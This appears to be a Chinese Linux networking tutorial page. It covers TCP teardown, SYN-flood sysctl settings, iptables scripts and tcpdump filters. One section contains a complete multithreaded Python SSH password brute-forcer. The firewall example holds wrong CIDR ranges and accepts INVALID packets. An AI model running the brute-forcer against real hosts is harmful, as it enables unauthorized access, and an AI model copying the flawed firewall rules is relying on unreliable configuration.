&#x7531;&#x4E8E;TCP&#x8FDE;&#x63A5;&#x662F;&#x5168;&#x53CC;&#x5DE5;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x6BCF;&#x4E2A;&#x65B9;&#x5411;&#x90FD;&#x5FC5;&#x987B;&#x5355;&#x72EC;&#x8FDB;&#x884C;&#x5173;&#x95ED;&#x3002;&#x8FD9;&#x4E2A;&#x539F;&#x5219;&#x662F;&#x5F53;&#x4E00;&#x65B9;&#x5B8C;&#x6210;&#x5B83;&#x7684;&#x6570;&#x636E;&#x53D1;&#x9001;&#x4EFB;&#x52A1;&#x540E;&#x5C31;&#x80FD;&#x53D1;&#x9001;&#x4E00;&#x4E2A;FIN&#x6765;&#x7EC8;&#x6B62;&#x8FD9;&#x4E2A;&#x65B9;&#x5411;&#x7684;&#x8FDE;&#x63A5;&#x3002;&#x6536;&#x5230;&#x4E00;&#x4E2A; FIN&#x53EA;&#x610F;&#x5473;&#x7740;&#x8FD9;&#x4E00;&#x65B9;&#x5411;&#x4E0A;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x6D41;&#x52A8;&#xFF0C;&#x4E00;&#x4E2A;TCP&#x8FDE;&#x63A5;&#x5728;&#x6536;&#x5230;&#x4E00;&#x4E2A;FIN&#x540E;&#x4ECD;&#x80FD;&#x53D1;&#x9001;&#x6570;&#x636E;&#x3002;&#x9996;&#x5148;&#x8FDB;&#x884C;&#x5173;&#x95ED;&#x7684;&#x4E00;&#x65B9;&#x5C06;&#x6267;&#x884C;&#x4E3B;&#x52A8;&#x5173;&#x95ED;&#xFF0C;&#x800C;&#x53E6;&#x4E00;&#x65B9;&#x6267;&#x884C;&#x88AB;&#x52A8;&#x5173;&#x95ED;&#x3002;
CP&#x7684;&#x8FDE;&#x63A5;&#x7684;&#x62C6;&#x9664;&#x9700;&#x8981;&#x53D1;&#x9001;&#x56DB;&#x4E2A;&#x5305;&#xFF0C;&#x56E0;&#x6B64;&#x79F0;&#x4E3A;&#x56DB;&#x6B21;&#x6325;&#x624B;(four-way handshake)&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x6216;&#x670D;&#x52A1;&#x5668;&#x5747;&#x53EF;&#x4E3B;&#x52A8;&#x53D1;&#x8D77;&#x6325;&#x624B;&#x52A8;&#x4F5C;&#xFF0C;&#x5728;socket&#x7F16;&#x7A0B;&#x4E2D;&#xFF0C;&#x4EFB;&#x4F55;&#x4E00;&#x65B9;&#x6267;&#x884C;close()&#x64CD;&#x4F5C;&#x5373;&#x53EF;&#x4EA7;&#x751F;&#x6325;&#x624B;&#x64CD;&#x4F5C;&#x3002;</p>
<p>&#xFF08;1&#xFF09;&#x5BA2;&#x6237;&#x7AEF;A&#x53D1;&#x9001;&#x4E00;&#x4E2A;FIN&#xFF0C;&#x7528;&#x6765;&#x5173;&#x95ED;&#x5BA2;&#x6237;A&#x5230;&#x670D;&#x52A1;&#x5668;B&#x7684;&#x6570;&#x636E;&#x4F20;&#x9001;&#x3002;</p>
<p>&#xFF08;2&#xFF09;&#x670D;&#x52A1;&#x5668;B&#x6536;&#x5230;&#x8FD9;&#x4E2A;FIN&#xFF0C;&#x5B83;&#x53D1;&#x56DE;&#x4E00;&#x4E2A;ACK&#xFF0C;&#x786E;&#x8BA4;&#x5E8F;&#x53F7;&#x4E3A;&#x6536;&#x5230;&#x7684;&#x5E8F;&#x53F7;&#x52A0;1&#x3002;&#x548C;SYN&#x4E00;&#x6837;&#xFF0C;&#x4E00;&#x4E2A;FIN&#x5C06;&#x5360;&#x7528;&#x4E00;&#x4E2A;&#x5E8F;&#x53F7;&#x3002;</p>
<p>&#xFF08;3&#xFF09;&#x670D;&#x52A1;&#x5668;B&#x5173;&#x95ED;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;A&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x53D1;&#x9001;&#x4E00;&#x4E2A;FIN&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;A&#x3002;</p>
<p>&#xFF08;4&#xFF09;&#x5BA2;&#x6237;&#x7AEF;A&#x53D1;&#x56DE;ACK&#x62A5;&#x6587;&#x786E;&#x8BA4;&#xFF0C;&#x5E76;&#x5C06;&#x786E;&#x8BA4;&#x5E8F;&#x53F7;&#x8BBE;&#x7F6E;&#x4E3A;&#x6536;&#x5230;&#x5E8F;&#x53F7;&#x52A0;1&#x3002;</p>
<p>&#x4E3A;&#x4F55;&#x4E3B;&#x673A;A&#x5728;&#x53D1;&#x9001;&#x4E86;&#x6700;&#x540E;&#x7684;&#x786E;&#x8BA4;&#x540E;&#x6CA1;&#x6709;&#x8FDB;&#x5165;CLOSED&#x72B6;&#x6001;&#xFF0C;&#x53CD;&#x800C;&#x8FDB;&#x5165;&#x4E86;&#x4E00;&#x4E2A;2MSL&#x7684;TIME-WAIT&#x3002;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x6709;&#x4E24;&#x4E2A;&#xFF1A;&#x7B2C;&#x4E00;&#xFF0C;&#x786E;&#x4FDD;&#x4E3B;&#x673A;A&#x6700;&#x540E;&#x53D1;&#x9001;&#x7684;&#x786E;&#x8BA4;&#x80FD;&#x591F;&#x5230;&#x8FBE;&#x4E3B;&#x673A;B&#x3002;&#x5982;&#x679C;&#x5904;&#x4E8E;LAST-ACK&#x72B6;&#x6001;&#x7684;&#x4E3B;&#x673A;B&#x4E00;&#x76F4;&#x6536;&#x4E0D;&#x5230;&#x6765;&#x81EA;&#x4E3B;&#x673A;A&#x7684;&#x786E;&#x8BA4;&#xFF0C;&#x5B83;&#x4F1A;&#x91CD;&#x4F20;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x7136;&#x540E;&#x4E3B;&#x673A;A&#x5C31;&#x53EF;&#x4EE5;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x65F6;&#x95F4;&#x53BB;&#x518D;&#x6B21;&#x53D1;&#x9001;&#x786E;&#x8BA4;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x4E5F;&#x53EA;&#x80FD;&#x5C3D;&#x6700;&#x5927;&#x529B;&#x91CF;&#x6765;&#x786E;&#x4FDD;&#x80FD;&#x591F;&#x6B63;&#x5E38;&#x65AD;&#x5F00;&#xFF0C;&#x5982;&#x679C;&#x4E3B;&#x673A;A&#x7684;&#x786E;&#x8BA4;&#x603B;&#x662F;&#x5728;&#x7F51;&#x7EDC;&#x4E2D;&#x6EDE;&#x7559;&#x5931;&#x6548;&#xFF0C;&#x4ECE;&#x800C;&#x8D85;&#x8FC7;&#x4E86;2MSL&#xFF0C;&#x6700;&#x540E;&#x4E5F;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x65AD;&#x5F00;&#xFF1B;&#x7B2C;&#x4E8C;&#xFF0C;&#x5982;&#x679C;&#x4E3B;&#x673A;A&#x5728;&#x53D1;&#x9001;&#x4E86;&#x786E;&#x8BA4;&#x4E4B;&#x540E;&#x7ACB;&#x5373;&#x8FDB;&#x5165;CLOSED&#x72B6;&#x6001;&#x3002;&#x5047;&#x8BBE;&#x4E4B;&#x540E;&#x4E3B;&#x673A;A&#x518D;&#x6B21;&#x5411;&#x4E3B;&#x673A;B&#x53D1;&#x9001;&#x4E00;&#x6761;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x800C;&#x8FD9;&#x6761;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x6BD4;&#x4E4B;&#x524D;&#x7684;&#x786E;&#x8BA4;&#x62A5;&#x6587;&#x66F4;&#x65E9;&#x5730;&#x5230;&#x8FBE;&#x4E3B;&#x673A;B&#xFF0C;&#x5219;&#x4F1A;&#x4F7F;&#x5F97;&#x4E3B;&#x673A;B&#x4EE5;&#x4E3A;&#x8FD9;&#x6761;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x662F;&#x5728;&#x65E7;&#x7684;&#x8FDE;&#x63A5;&#x4E2D;A&#x53D1;&#x51FA;&#x7684;&#x62A5;&#x6587;&#xFF0C;&#x5E76;&#x4E0D;&#x770B;&#x6210;&#x662F;&#x4E00;&#x6761;&#x65B0;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x4E86;&#xFF0C;&#x5373;&#x4F7F;&#x5F97;&#x8FD9;&#x4E2A;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x5931;&#x6548;&#x4E86;&#xFF0C;&#x589E;&#x52A0;2MSL&#x7684;&#x65F6;&#x95F4;&#x53EF;&#x4EE5;&#x4F7F;&#x5F97;&#x8FD9;&#x4E2A;&#x5931;&#x6548;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x4F5C;&#x5E9F;&#xFF0C;&#x8FD9;&#x6837;&#x624D;&#x4E0D;&#x5F71;&#x54CD;&#x4E0B;&#x6B21;&#x65B0;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x4E2D;&#x51FA;&#x73B0;&#x5931;&#x6548;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x3002;
&#x5728;&#x4E0B;&#x9762;&#x7684;&#x6293;&#x5305;&#x5B9E;&#x9A8C;&#x4E2D;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x53EA;&#x6709;&#x4E09;&#x4E2A;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x56DB;&#x4E2A;&#x3002;&#x56E0;&#x4E3A;&#x5728;TCP&#x8FDE;&#x63A5;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x786E;&#x8BA4;&#x7684;&#x53D1;&#x9001;&#x6709;&#x4E00;&#x4E2A;&#x5EF6;&#x65F6;&#xFF08;&#x5373;&#x7ECF;&#x53D7;&#x5EF6;&#x65F6;&#x7684;&#x786E;&#x8BA4;&#xFF09;&#xFF0C;&#x4E00;&#x7AEF;&#x5728;&#x53D1;&#x9001;&#x786E;&#x8BA4;&#x7684;&#x65F6;&#x5019;&#x5C06;&#x7B49;&#x5F85;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#xFF0C;&#x5982;&#x679C;&#x81EA;&#x5DF1;&#x5728;&#x8FD9;&#x6BB5;&#x4E8B;&#x4EF6;&#x5185;&#x4E5F;&#x6709;&#x6570;&#x636E;&#x8981;&#x53D1;&#x9001;&#xFF0C;&#x5C31;&#x8DDF;&#x786E;&#x8BA4;&#x4E00;&#x8D77;&#x53D1;&#x9001;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#xFF0C;&#x5219;&#x786E;&#x8BA4;&#x5355;&#x72EC;&#x53D1;&#x9001;&#x3002;&#x800C;&#x6211;&#x4EEC;&#x7684;&#x6293;&#x5305;&#x5B9E;&#x9A8C;&#x4E2D;&#xFF0C;&#x7531;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5148;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#xFF0C;&#x4E4B;&#x540E;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x786E;&#x8BA4;&#x7684;&#x5EF6;&#x8FDF;&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x4E5F;&#x6709;&#x8BF7;&#x6C42;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x9700;&#x8981;&#x53D1;&#x9001;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x4E0E;&#x4E0A;&#x6B21;&#x786E;&#x8BA4;&#x4E00;&#x8D77;&#x53D1;&#x9001;&#xFF0C;&#x56E0;&#x6B64;&#x5C31;&#x53EA;&#x6709;&#x4E09;&#x4E2A;&#x6570;&#x636E;&#x62A5;&#x4E86;&#x3002;</p>
<h2 id="ddos&#x539F;&#x7406;&#xFF0C;&#x53CA;&#x8F7B;&#x91CF;&#x7EA7;&#x522B;&#x653B;&#x51FB;&#x7684;&#x9632;&#x6B62;">DDOS&#x539F;&#x7406;&#xFF0C;&#x53CA;&#x8F7B;&#x91CF;&#x7EA7;&#x522B;&#x653B;&#x51FB;&#x7684;&#x9632;&#x6B62;</h2>
<h1 id="vim-etcsysctlconf">vim /etc/sysctl.conf</h1>
<p>net.ipv4.tcp_max_syn_backlog = 8096 --&#x8D85;&#x8FC7;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;&#x540E;&#x4EA7;&#x751F;&#x65B0;syn&#x961F;&#x5217;&#x7684;&#x957F;&#x5EA6;
net.ipv4.tcp_synack_retries = 2 --syn&#x786E;&#x8BA4;&#x7684;&#x91CD;&#x8BD5;&#x6B21;&#x6570;
net.ipv4.ip_local_port_range = 1024 65535--&#x8868;&#x793A;&#x7528;&#x4E8E;&#x5411;&#x5916;&#x8FDE;&#x63A5;&#x7684;&#x7AEF;&#x53E3;&#x8303;&#x56F4;&#x3002;&#x7F3A;&#x7701;&#x60C5;&#x51B5;&#x4E0B;&#x5F88;&#x5C0F;&#xFF1A;32768&#x5230;61000&#xFF0C;&#x6539;&#x4E3A;1024&#x5230;65000&#x3002;
net.ipv4.tcp_syncookies = 1 --&#x8868;&#x793A;&#x5F00;&#x542F;SYNCookies&#x3002;&#x5F53;&#x51FA;&#x73B0;SYN&#x7B49;&#x5F85;&#x961F;&#x5217;&#x6EA2;&#x51FA;&#x65F6;&#xFF0C;&#x542F;&#x7528;cookies&#x6765;&#x5904;&#x7406;&#xFF0C;&#x53EF;&#x9632;&#x8303;&#x5C11;&#x91CF;SYN&#x653B;&#x51FB;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;0&#xFF0C;&#x8868;&#x793A;&#x5173;&#x95ED;&#xFF1B;
net.ipv4.tcp_tw_reuse = 1 --&#x8868;&#x793A;&#x5F00;&#x542F;&#x91CD;&#x7528;&#x3002;&#x5141;&#x8BB8;&#x5C06;TIME-WAITsockets&#x91CD;&#x65B0;&#x7528;&#x4E8E;&#x65B0;&#x7684;TCP&#x8FDE;&#x63A5;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;0&#xFF0C;&#x8868;&#x793A;&#x5173;&#x95ED;&#xFF1B;
net.ipv4.tcp_tw_recycle = 1 --&#x8868;&#x793A;&#x5F00;&#x542F;TCP&#x8FDE;&#x63A5;&#x4E2D;TIME-WAIT sockets&#x7684;&#x5FEB;&#x901F;&#x56DE;&#x6536;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;0&#xFF0C;&#x8868;&#x793A;&#x5173;&#x95ED;&#x3002;
net.ipv4.tcp_max_tw_buckets=5000--&#x8868;&#x793A;&#x7CFB;&#x7EDF;&#x540C;&#x65F6;&#x4FDD;&#x6301;TIME_WAIT&#x5957;&#x63A5;&#x5B57;&#x7684;&#x6700;&#x5927;&#x6570;&#x91CF;&#xFF0C;&#x5982;&#x679C;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x6570;&#x5B57;,TIME_WAIT&#x5957;&#x63A5;&#x5B57;&#x5C06;&#x7ACB;&#x523B;&#x88AB;&#x6E05;&#x9664;&#x5E76;&#x6253;&#x5370;&#x8B66;&#x544A;&#x4FE1;&#x606F;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A;180000&#xFF0C;&#x6539;&#x4E3A;5000&#x3002;
sysctl -p
1&#x3001;&#x901A;&#x8FC7;iptables&#x9632;&#x6B62;&#x8F7B;&#x91CF;&#x7EA7;&#x522B;&#x7684;DDOS
-m limit
-m connlimit
2&#x3001;DDOS&#x7684;&#x539F;&#x7406;&#xFF0C;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF08;&#x5BA2;&#x6237;&#x7AEF;&#x7B2C;&#x4E09;&#x6B21;&#x4E0D;&#x56DE;&#x5E94;&#x670D;&#x52A1;&#x7AEF;&#xFF09;
3&#x3001;&#x901A;&#x8FC7;&#x5185;&#x6838;&#x589E;&#x5927;TCP&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x652F;&#x6301;&#x66F4;&#x591A;&#x7684;&#x8FDE;&#x63A5;&#x3002;
4&#x3001;&#x589E;&#x52A0;&#x66F4;&#x5F3A;&#x5927;&#x7684;&#x786C;&#x4EF6;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x7528;&#x4E8E;&#x4E22;&#x5F03;&#xFF08;&#x8FC7;&#x6EE4;&#xFF09;&#x6389;&#x4E0D;&#x6B63;&#x5E38;syn&#x8BF7;&#x6C42;,&#x642D;&#x5EFA;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x96C6;&#x7FA4;&#xFF0C;&#x53E6;&#x5916;&#x4FDD;&#x8BC1;&#x4F60;&#x7684;&#x5916;&#x7F51;&#x6709;&#x8DB3;&#x591F;&#x5927;&#x7684;&#x5E26;&#x5BBD;
&#x7B2C;&#x4E00;&#x79CD; &#x4E00;</p>
<h2 id="&#x4ECE;&#x54EA;&#x4E2A;&#x7F51;&#x5361;&#x51FA;&#x53BB;-o">&#x4ECE;&#x54EA;&#x4E2A;&#x7F51;&#x5361;&#x51FA;&#x53BB; -o</h2>
<p>&#x4F20;&#x8F93;&#x5C42;&#xFF1A;&#x534F;&#x8BAE;&#xFF08;tcp/udp&#xFF09;
&#x7AEF;&#x53E3;&#xFF08;sport /dport&#xFF09;
&#x7F51;&#x7EDC;&#x5C42;&#xFF1A;
IP&#x5730;&#x5740;&#xFF08;sip /dip /icmp&#xFF09; ping
&#x6570;&#x636E;&#x94FE;&#x8DEF;&#x5C42;&#xFF1A;
mac&#x5730;&#x5740;&#xFF08;--mac-source&#xFF09;
&#x7269;&#x7406;&#x5C42;&#xFF1A;
&#x4ECE;&#x54EA;&#x4E2A;&#x7F51;&#x5361;&#x8FDB;&#x6765; -i eth0 eth1 &#x670D;&#x52A1;&#x5668;2&#x4E2A;&#x5730;&#x5740; &#x5916;&#x7F51;&#x5730;&#x5740; &#x4E00;&#x4E2A;&#x5185;&#x7F51;&#x5730;&#x5740;
&#x4ECE;&#x54EA;&#x4E2A;&#x7F51;&#x5361;&#x51FA;&#x53BB; -o</p>
<h2 id="iptables&#x9632;&#x5FA1;cc&#x653B;&#x51FB;&#x811A;&#x672C;">iptables&#x9632;&#x5FA1;cc&#x653B;&#x51FB;&#x811A;&#x672C;</h2>
<pre><code>#!/bin/sh
drop_ip=`tail -n 5000 /data/logs/www.log |awk &apos;{a[$1]++}END{for(i in a)if(a[i]&gt;300)print i}&apos;`
if test -n $drop_ip;then
for i in $drop_ip
do
if [ -z &quot;`iptables -nvL |grep $i`&quot; ];then
/sbin/iptables -I INPUT -s $i -j DROP
fi
done
fi
</code></pre><h2 id="iptable&#x901A;&#x7528;&#x811A;&#x672C;">iptable&#x901A;&#x7528;&#x811A;&#x672C;</h2>
<h1 id="binbash">!/bin/bash</h1>
<h1 id="descriptthe-firewall-script">Descript:The Firewall Script.</h1>
<p>iptables -F INPUT
iptables -F OUTPUT
iptables -P INPUT DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,INVALID -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -p tcp -m multiport --dport 8001:8030,5001:5020,443,22,21,843,80 -j ACCEPT<br>iptables -A INPUT -p tcp -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp -s 192.168.0/16 -j ACCEPT
iptables -A INPUT -p tcp -s 172.16.0.0/8 -j ACCEPT
iptables -I INPUT -s 8.8.8.8 -j ACCEPT
iptables -I INPUT -s 127.0.0.1 -p udp --dport 161 -j ACCEPT
iptables -A INPUT -p icmp -j ACCEPT
iptables -A INPUT -p udp -m multiport --dport 8001:8020 -j ACCEPT</p>
<h2 id="&#x4F7F;&#x7528;python&#x591A;&#x7EBF;&#x7A0B;&#x66B4;&#x529B;&#x7834;&#x89E3;linux&#x5BC6;&#x7801;">&#x4F7F;&#x7528;python&#x591A;&#x7EBF;&#x7A0B;&#x66B4;&#x529B;&#x7834;&#x89E3;linux&#x5BC6;&#x7801;</h2>
<pre><code>#!/bin/python
import optparse  
import time  
from threading import *  
from pexpect import pxssh  

maxConnections = 100 
connection_lock = BoundedSemaphore(value=maxConnections)  

Found = False  
Fails = 0  

def connect(host, user, password, release):  
    global Found  
    global Fails  

    try:  
        s = pxssh.pxssh()  
        s.login(host, user, password)  
        print &apos;[+] Password Found: &apos; + password  
        Found = True  
    except Exception, e:  
        if &apos;read_nonblocking&apos; in str(e):  
            Fails += 1  
            time.sleep(5)  
            connect(host, user, password, False)  
        elif &apos;synchronize with original prompt&apos; in str(e):  
            time.sleep(1)  
            connect(host, user, password, False)  

    finally:  
        if release: connection_lock.release()  

def main():  
    parser = optparse.OptionParser(&apos;usage %prog -H &lt;target host&gt; -u &lt;user&gt; -F &lt;password list&gt;&apos;  
                              )  
    parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;specify target host&apos;)  
    parser.add_option(&apos;-F&apos;, dest=&apos;passwdFile&apos;, type=&apos;string&apos;, help=&apos;specify password file&apos;)  
    parser.add_option(&apos;-u&apos;, dest=&apos;user&apos;, type=&apos;string&apos;, help=&apos;specify the user&apos;)  

    (options, args) = parser.parse_args()  
    host = options.tgtHost  
    passwdFile = options.passwdFile  
    user = options.user  

    if host == None or passwdFile == None or user == None:  
        print parser.usage  
        exit(0)  

    fn = open(passwdFile, &apos;r&apos;)  
    for line in fn.readlines():  
        if Found:  
            print &quot;[*] Exiting: Password Found&quot;  
            exit(0)  
        if Fails &gt; 5:  
            print &quot;[!] Exiting: Too Many Socket Timeouts&quot;  
            exit(0)  

        connection_lock.acquire()  
        password = line.strip(&apos;\r&apos;).strip(&apos;\n&apos;)  
        print &quot;[-] Testing: &quot;+str(password)  
        t = Thread(target=connect, args=(host, user, password, True))  
        child = t.start()  

if __name__ == &apos;__main__&apos;:  
    main()
</code></pre><h2 id="tcpdump-&#x6293;&#x5305;&#x5DE5;&#x5177;">tcpdump &#x6293;&#x5305;&#x5DE5;&#x5177;</h2>
<p>1&#xFF09;tcpdump&#xFF08;&#x4F20;&#x8F93;&#xFF0F;&#x7F51;&#x7EDC;&#x5C42;&#xFF09;</p>
<p>tcpdump -i eth0</p>
<p>tcpdump -i eth0 -vnn</p>
<p>-v&#xFF1A;&#x663E;&#x793A;&#x5305;&#x542B;&#x6709;TTL&#xFF0C;TOS&#x503C;&#x7B49;&#x7B49;&#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#x4FE1;&#x606F;</p>
<p>-n&#xFF1A;&#x4E0D;&#x8981;&#x505A;IP&#x89E3;&#x6790;&#x4E3A;&#x4E3B;&#x673A;&#x540D;</p>
<p>-nn&#xFF1A;&#x4E0D;&#x505A;&#x540D;&#x5B57;&#x89E3;&#x6790;&#x548C;&#x7AEF;&#x53E3;&#x89E3;&#x6790;</p>
<p>&#x66F4;&#x6709;&#x9488;&#x5BF9;&#x6027;&#x7684;&#x6293;&#x5305;&#xFF1A;</p>
<p>&#x9488;&#x5BF9;IP&#xFF0C;&#x7F51;&#x6BB5;&#xFF0C;&#x7AEF;&#x53E3;&#xFF0C;&#x534F;&#x8BAE;</p>
<p>tcpdump -n -i eth0 -vnn host 192.168.0.154 --&#x4E3B;&#x673A;&#x5730;&#x5740;&#x91CC;&#x8FB9;&#x53EA;&#x8981;&#x5305;&#x542B;&#x5730;&#x5740;&#x6709;&#xFF1A;192.168.0.154</p>
<p>tcpdump -i eth0 -vnn net 192.168.0.0 /24 --&#x6293;&#x53D6;&#x4E00;&#x4E2A;&#x7F51;&#x6BB5;&#x6570;&#x636E;&#x5305;</p>
<p>tcpdump -i eth0 -vnn port 22</p>
<p>tcpdump -i eth0 -vnn udp</p>
<p>tcpdump -i eth0 -vnn icmp ping</p>
<p>tcpdump -i eth0 -vnn arp</p>
<p>$x = y$$x = y$ # tcpdump -i eth0 -vnn ip</p>
<p>tcpdump -n -i eth0 -vnn src host 192.168.0.154</p>
<p>tcpdump -i eth0 -vnn dst host 192.168.0.154</p>
<p>tcpdump -i eth0 -vnn src port 22</p>
<p>tcpdump -i eth0 -vnn src host 192.168.0.253 and dst port 22</p>
<p>tcpdump -i eth0 -vnn src host 192.168.0.154 or port 22</p>
<p>tcpdump -i eth0 -vnn src host 192.168.0.154 and not port 22</p>
<p>&#x6293;&#x5305;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x529F;&#x80FD;&#x5728;&#x4E8E;&#x8C03;&#x8BD5;&#xFF0C;&#x6BD4;&#x5982;&#x5728;&#x8C03;&#x8BD5;&#x67D0;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x65F6;&#x5019; &#x660E;&#x660E;&#x670D;&#x52A1;&#x8D77;&#x6765;&#x4E86; &#x4F46;&#x662F;&#x4E0D;&#x77E5;&#x9053;&#x4E3A;&#x4EC0;&#x4E48;&#x94FE;&#x63A5;&#x4E0D;&#x4E0A; &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6293;&#x5305;&#x5DE5;&#x5177;&#x6765;&#x6D4B;&#x8BD5;&#x770B;&#x770B;&#x8BF7;&#x6C42;&#x5305;&#x6709;&#x6CA1;&#x6709;&#x8FC7;&#x6765;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6765;&#x5224;&#x65AD;&#x662F;&#x4F20;&#x8F93;&#x8FC7;&#x7A0B;&#x4E2D;&#x5931;&#x8D25;&#x4E86; &#x8FD8;&#x662F;&#x88AB;&#x670D;&#x52A1;&#x5668;&#x62D2;&#x7EDD;&#x4E86;</p>

                    
                    </section>
                
                
                </div>
            </div>
        </div>

        
        <a href="./di-qi-jie-ff1a-shell-jiao-ben.html" class="navigation navigation-prev " aria-label="Previous page: 第七节：shell脚本"><i class="fa fa-angle-left"></i></a>
        
        
        <a href="./di-jiu-jie-ff1a-zheng-ze-biao-da-shi.html" class="navigation navigation-next " aria-label="Next page: 第九节：正则表达式"><i class="fa fa-angle-right"></i></a>
        
    </div>
</div>

        
<script src="gitbook/app.js"></script>

    
    <script src="gitbook/plugins/gitbook-plugin-search/lunr.min.js"></script>
    

    
    <script src="gitbook/plugins/gitbook-plugin-search/search.js"></script>
    

    
    <script src="gitbook/plugins/gitbook-plugin-sharing/buttons.js"></script>
    

    
    <script src="gitbook/plugins/gitbook-plugin-fontsettings/buttons.js"></script>
    

<script>
require(["gitbook"], function(gitbook) {
    var config = {"highlight":{},"search":{"maxIndexSize":1000000},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2}};
    gitbook.start(config);
});
</script>

        
    </body>
    
</html>
